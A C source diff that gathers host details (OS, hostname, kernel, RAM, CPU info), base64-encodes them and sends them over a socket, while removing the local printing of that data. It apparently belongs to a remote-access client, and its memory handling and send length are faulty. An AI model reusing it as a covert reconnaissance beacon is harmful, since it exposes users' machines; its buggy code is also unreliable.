@@ -18,7 +18,7 @@ char* getSytmIfrtn(){
     // Información del sistema operativo
     struct utsname buffer;
     uname(&buffer);
-    sprintf(info + strlen(info), "\tOS name:\t %s\n\n", buffer.sysname);
+    sprintf(info + strlen(info), "\n\tOS name:   %s\n\n", buffer.sysname);
     sprintf(info + strlen(info), "| PC Name:\t %s\n", buffer.nodename);
     sprintf(info + strlen(info), "| kernel info:\t %s\n", buffer.release);
     sprintf(info + strlen(info), "| Architecture:\t %s\n", buffer.machine);
@@ -28,7 +28,7 @@ char* getSytmIfrtn(){
     struct sysinfo memInfo;
     sysinfo(&memInfo); 
     sprintf(info + strlen(info), "| Free RAM:\t %lu MB\n", memInfo.freeram / (1024 * 1024));
-    sprintf(info + strlen(info), "| Total RAM:\t %lu MB\n", memInfo.totalram / (1024 * 1024)); // En MB
+    sprintf(info + strlen(info), "| Total RAM:\t %lu MB\n\n\n", memInfo.totalram / (1024 * 1024)); // En MB
 
     // Información del procesador
     FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
@@ -56,7 +56,8 @@ char* getSytmIfrtn(){
 char* dcdeStm(char* systemInfo){
     char* systemInfoEncode = malloc(strlen(systemInfo) + 1);
 
-    systemInfoEncode = base64_encode(systemInfo, strlen(systemInfo));
+    long size = strlen(systemInfo);
+    systemInfoEncode = base64_encode(systemInfo, size, &size);
     //printf("%s", systemInfoEncode);
     
     return systemInfoEncode;
@@ -67,9 +68,6 @@ int srtSysInfo(int conn){
     char* systemInfo = getSytmIfrtn();
 
     send(conn, dcdeStm(systemInfo), strlen(systemInfo), 0);
-    
-    printf("%s", systemInfo); // Imprime la información del sistema
-    printf("%s", dcdeStm(systemInfo));
 
     free(systemInfo); // No olvides liberar la memoria después de usarla
     sleep(0.3);
